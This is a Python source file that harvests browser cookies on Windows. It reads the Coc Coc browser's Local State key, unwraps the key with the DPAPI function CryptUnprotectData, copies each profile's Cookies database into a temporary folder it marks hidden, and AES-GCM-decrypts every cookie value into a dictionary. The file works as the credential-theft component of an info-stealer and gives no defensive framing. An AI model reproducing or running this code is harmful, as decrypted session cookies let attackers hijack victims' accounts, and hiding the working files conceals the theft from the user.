import os
import ujson as json
import base64
import sqlite3
from win32crypt import CryptUnprotectData
from Crypto.Cipher.AES import new, MODE_GCM
from time import time_ns
from random import randint
import shutil
import ctypes


class Temp(os.PathLike):
    def __init__(self, dir):
        self.dir = dir
    def __fspath__(self):
        return os.path.join(TEMP, self.dir)
    @staticmethod
    def make(path, src):
        tmp_path = Temp(path)
        shutil.copyfile(src, tmp_path)
        return tmp_path
    

TIME_STAMP = str(time_ns())
FILE_ATTRIBUTE_HIDDEN = 0x02
SEED = randint(100000, 999999)
TEMP = f".\\__tmp__{TIME_STAMP}_{SEED}"

UserData = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CocCoc", "Browser", "User Data")
basedirlen = len(UserData)

def get_encryption_key():
    local_state_path = os.path.join(UserData, "Local State")
    with open(local_state_path, "rb") as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = new(key, MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return False

KEY = None

def get_cookies_db(profile):
    filename = Temp.make(f"Runtime_{time_ns()}.db", os.path.join(UserData, profile, "Network", "Cookies"))
    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    cursor.execute('SELECT host_key, name, value, encrypted_value\nFROM cookies')
    coo = {}
    for host_key, name, value, encrypted_value in cursor.fetchall():
        if not host_key in coo:
            coo[host_key] = {}
        coo[host_key][name] = value if value else decrypt_data(encrypted_value, KEY)
    db.close()
    return coo

def getProfiles():
    profiles = []
    if os.path.exists(os.path.join(UserData, "Default")):
        profiles.append("Default")
    for dir in os.scandir(UserData):
        if os.path.isdir(dir) and dir.name[:7] == "Profile":
            profiles.append(dir.name)
    return profiles

def create():
    global KEY
    KEY = get_encryption_key()
    if not os.path.exists(TEMP):
        os.mkdir(TEMP)
        ctypes.windll.kernel32.SetFileAttributesW(TEMP, FILE_ATTRIBUTE_HIDDEN)

def delete():
    global KEY
    KEY = None
    if os.path.exists(TEMP):
        shutil.rmtree(TEMP)

def cookies():
    coo = {}
    try:
        for prof in getProfiles():
            coo[prof] = get_cookies_db(prof)
    except: pass
    return coo